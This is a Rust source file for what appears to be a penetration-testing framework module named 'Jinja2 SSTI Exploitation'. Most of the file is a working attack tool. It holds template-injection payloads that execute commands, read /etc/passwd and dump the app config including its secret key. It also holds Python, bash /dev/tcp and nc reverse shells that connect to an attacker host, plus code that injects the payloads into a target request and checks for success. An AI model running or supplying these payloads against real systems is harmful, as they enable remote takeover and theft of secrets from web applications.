use anyhow::Result;
use async_trait::async_trait;
use chrono::Utc;

use crate::web::{WebModule, ModuleInfo, ModuleContext, ExecutionResult};
use crate::web::injection::{InjectionConfig, InjectionEngine};

pub struct Jinja2Module;

impl Jinja2Module {
    pub fn new() -> Self {
        Self
    }
    
    fn get_payloads(&self, context: &ModuleContext) -> Vec<String> {
        let lhost = context.get_option("LHOST").map(|s| s.as_str()).unwrap_or("ATTACKER_IP");
        let lport = context.get_option("LPORT").map(|s| s.as_str()).unwrap_or("4444");
        
        vec![
            // Detection payloads
            "{{7*7}}".to_string(),
            "{{7*'7'}}".to_string(),
            "${7*7}".to_string(),
            
            // Basic RCE
            "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}".to_string(),
            "{{ config.items() }}".to_string(),
            
            // File read
            "{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}".to_string(),
            
            // Advanced RCE - Python reverse shell
            format!("{{{{ self.__init__.__globals__.__builtins__.__import__('os').popen('python -c \\'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{}\",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\\' ').read() }}}}", lhost, lport),
            
            // Bash reverse shell
            format!("{{{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -i >& /dev/tcp/{}/{} 0>&1').read() }}}}", lhost, lport),
            
            // nc reverse shell
            format!("{{{{ self.__init__.__globals__.__builtins__.__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f').read() }}}}", lhost, lport),
            
            // Command execution via subprocess
            "{{ self.__init__.__globals__.__builtins__.__import__('subprocess').check_output('whoami', shell=True) }}".to_string(),
            
            // Alternative RCE vectors
            "{{ cycler.__init__.__globals__.os.popen('id').read() }}".to_string(),
            "{{ joiner.__init__.__globals__.os.popen('id').read() }}".to_string(),
            
            // Config disclosure
            "{{ config }}".to_string(),
            "{{ self }}".to_string(),
            
            // MRO traversal
            "{{ [].__class__.__base__.__subclasses__() }}".to_string(),
        ]
    }
}

#[async_trait]
impl WebModule for Jinja2Module {
    fn info(&self) -> ModuleInfo {
        ModuleInfo {
            id: "web/ssti/jinja2".to_string(),
            name: "Jinja2 SSTI Exploitation".to_string(),
            category: "SSTI".to_string(),
            description: "Server-Side Template Injection exploitation for Jinja2 (Flask/Django). Tests detection payloads and RCE vectors including reverse shells.".to_string(),
            author: "CAP Framework".to_string(),
            references: vec![
                "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2".to_string(),
                "https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti".to_string(),
            ],
        }
    }
    
    fn required_options(&self) -> Vec<String> {
        vec![
            "REQUEST (file path)".to_string(),
            "INJECTION_POINT (parameter name)".to_string(),
            "LHOST (attacker IP for reverse shells)".to_string(),
            "LPORT (attacker port for reverse shells)".to_string(),
        ]
    }
    
    async fn execute(&self, context: &ModuleContext) -> Result<ExecutionResult> {
        let request = context.request.as_ref()
            .ok_or_else(|| anyhow::anyhow!("No request loaded. Use 'set REQUEST <file>'"))?;
        
        let injection_point = context.injection_point.as_ref()
            .ok_or_else(|| anyhow::anyhow!("No injection point set. Use 'set INJECTION_POINT <param>'"))?;
        
        let payloads = self.get_payloads(context);
        
        let config = InjectionConfig {
            dry_run: context.get_option("DRY_RUN").map(|s| s == "true").unwrap_or(false),
            confirm_each: context.get_option("CONFIRM_EACH").map(|s| s == "true").unwrap_or(false),
            timeout_secs: 15,
            follow_redirects: false,
        };
        
        let engine = InjectionEngine::new(config)?;
        
        let results = engine.inject_batch(request, injection_point, &payloads).await?;
        
        // Analyze results for successful injection
        let mut findings = Vec::new();
        
        for result in &results {
            // Check for template evaluation (49, 7777777)
            if result.response_body.contains("49") || result.response_body.contains("7777777") {
                findings.push(format!("Template evaluation detected with payload: {}", result.payload));
            }
            
            // Check for command output
            if result.response_body.contains("uid=") || result.response_body.contains("root:") {
                findings.push(format!("Command execution successful with payload: {}", result.payload));
            }
            
            // Check for config disclosure
            if result.response_body.contains("SECRET_KEY") || result.response_body.contains("DEBUG") {
                findings.push(format!("Configuration disclosure with payload: {}", result.payload));
            }
            
            // Check for error-based confirmation
            if result.analysis.has_error_indicators && result.response_body.to_lowercase().contains("jinja") {
                findings.push(format!("Jinja2 error triggered by payload: {}", result.payload));
            }
        }
        
        Ok(ExecutionResult {
            success: !findings.is_empty(),
            findings,
            injection_results: results,
            module_id: self.info().id,
            timestamp: Utc::now(),
        })
    }
}
